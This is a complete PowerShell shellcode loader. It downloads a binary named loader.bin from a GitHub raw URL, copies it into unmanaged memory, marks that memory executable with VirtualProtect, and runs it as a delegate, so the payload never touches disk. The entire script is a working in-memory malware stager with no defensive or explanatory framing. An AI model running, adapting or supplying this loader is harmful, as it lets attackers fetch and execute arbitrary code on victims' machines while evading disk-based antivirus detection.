try {
    # Download and load shellcode directly into memory
    $shellcodeUrl = "https://github.com/ffx69024/ihr239t23t/raw/refs/heads/master/loader.bin"
    $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -UseBasicParsing).Content

    # Allocate memory for the shellcode
    $size = $shellcode.Length
    $address = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
    [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $address, $size)

    # Define the VirtualProtect function using P/Invoke
    $virtualProtect = @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
"@
    Add-Type -TypeDefinition $virtualProtect

    # Mark the memory as executable
    $oldProtect = 0
    $protectResult = [Win32]::VirtualProtect($address, $size, 0x40, [ref]$oldProtect)  # 0x40 = PAGE_EXECUTE_READWRITE
    if (-not $protectResult) {
        throw "Failed to mark memory as executable."
    }

    # Create a delegate to the shellcode
    $shellcodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($address, [type]::GetType("System.Action"))

    # Execute the shellcode
    $shellcodeDelegate.Invoke()

    # Free the allocated memory (optional, as the process may terminate)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($address)
}
catch {
    Write-Host "[-] An error occurred: $_"
}